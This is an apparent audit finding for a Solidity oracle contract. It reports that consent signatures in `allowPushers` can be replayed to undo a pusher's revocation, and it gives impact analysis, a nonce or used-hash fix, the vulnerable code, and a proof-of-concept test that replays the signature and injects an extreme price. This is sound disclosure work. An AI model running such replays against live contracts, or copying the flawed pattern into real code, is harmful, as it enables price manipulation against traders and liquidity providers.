### Title
Pusher consent signature is never invalidated, allowing creator to silently re-establish delegation after `revokePusher` — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowPushers` verifies a pusher's EIP-191 consent signature but never marks it as consumed. After a pusher calls `revokePusher()` to opt out, the creator can immediately call `allowPushers` again with the identical signature — as long as the deadline has not yet expired — and the delegation is silently re-established. The pusher's self-revocation is therefore not final; it is only effective once the deadline timestamp passes.

---

### Finding Description

`allowPushers` constructs a digest over `(chainid, address(this), deadline, pusher, msg.sender)` and requires the recovered signer to equal the pusher address: [1](#0-0) 

After the check passes, `namespaceRemapping[pusher]` is set to `msg.sender` (the creator). No nonce is incremented, no used-signature bitmap is written, and no check verifies whether the pusher has previously revoked this exact delegation.

`revokePusher` clears the mapping: [2](#0-1) 

But the original signature remains cryptographically valid. The creator retains it off-chain and can replay it in a second `allowPushers` call at any time before `deadline`. The mapping is overwritten back to `msg.sender` and the `PusherAuthorized` event fires again — the revocation is undone.

The code comment on `allowPushers` explicitly acknowledges the risk ("an undated signature could re-establish a delegation AFTER the pusher revoked it") and states the deadline is the mitigation. However, the deadline only bounds the *window* of replays; it does not prevent replay within that window. There is no mechanism that makes the first successful `allowPushers` call consume the signature. [3](#0-2) 

The `fallback` push path resolves the effective namespace at call time: [4](#0-3) 

So any push made by the pusher after the creator replays the signature lands in the creator's namespace, not the pusher's own namespace.

---

### Impact Explanation

A pusher whose private key is compromised calls `revokePusher()` to stop the attacker from writing bad prices into the creator's namespace. The creator — unaware of the compromise, or colluding — replays the original consent signature via `allowPushers`. The attacker's key is now re-authorized and continues pushing manipulated prices into the creator's namespace. Those prices propagate through `getOracleData` → `AnchoredPriceProvider.getBidAndAskPrice` → `MetricOmmPool.swap`, causing bad-price execution against pool LPs and traders.

The invariant broken: **a pusher's self-revocation must be final and irrevocable by the creator until a new consent is signed.**

---

### Likelihood Explanation

The creator retains the pusher's original signature bytes off-chain (they submitted it in the first `allowPushers` call, which is public on-chain). Replaying it costs one transaction. The window is bounded by the deadline, which in practice is set to hours or days (the test suite uses `block.timestamp + 1 days`). [5](#0-4) 

The trigger requires the creator to call `allowPushers` a second time, which is a valid, unprivileged, public function call. No admin key is needed.

---

### Recommendation

Track used signatures with a per-pusher nonce or a `mapping(bytes32 => bool) usedSignatures` bitmap. On each successful `allowPushers` call, record the digest as consumed and revert if it is presented again:

```solidity
mapping(bytes32 => bool) private _usedDelegationHashes;

// inside allowPushers loop:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(!_usedDelegationHashes[hash], SignatureAlreadyUsed());
require(pusher == ECDSA.recover(hash, signatures[i]));
_usedDelegationHashes[hash] = true;
```

Alternatively, include a per-pusher nonce in the signed payload and increment it on each successful delegation, so a revoked pusher must sign a fresh message with the new nonce before delegation can be re-established.

### Proof of Concept

```solidity
// 1. Pusher signs consent for creator with deadline = now + 1 day.
bytes memory sig = _signConsent(PUSHER_KEY, block.timestamp + 1 days, pusher, creator);

// 2. Creator establishes delegation.
address[] memory pushers = new address[](1);
pushers[0] = pusher;
bytes[] memory sigs = new bytes[](1);
sigs[0] = sig;
vm.prank(creator);
oracle.allowPushers(block.timestamp + 1 days, pushers, sigs);
assertEq(oracle.namespaceRemapping(pusher), creator); // delegated

// 3. Pusher self-revokes.
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // revoked

// 4. Creator replays the SAME signature — no nonce, no used-hash check.
vm.prank(creator);
oracle.allowPushers(block.timestamp + 1 days, pushers, sigs); // succeeds
assertEq(oracle.namespaceRemapping(pusher), creator); // delegation re-established

// 5. Attacker (holding pusher key) pushes a manipulated price into creator's namespace.
uint56 tsMs = uint56((block.timestamp + 1) * 1000);
uint48 badRaw = _packRaw(999_999_999, 0, 0); // extreme price
vm.prank(pusher); // attacker controls pusher key
(bool ok,) = address(oracle).call(_wordAt(0, 0, badRaw, tsMs));
assertTrue(ok);

// Bad price now lives in creator's namespace and will be consumed by any
// AnchoredPriceProvider / pool swap that reads feedIdOf(creator, 0, 0).
IOffchainOracle.OracleData memory data = oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
assertGt(data.price, 0); // manipulated value accepted
```

```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
    }
```
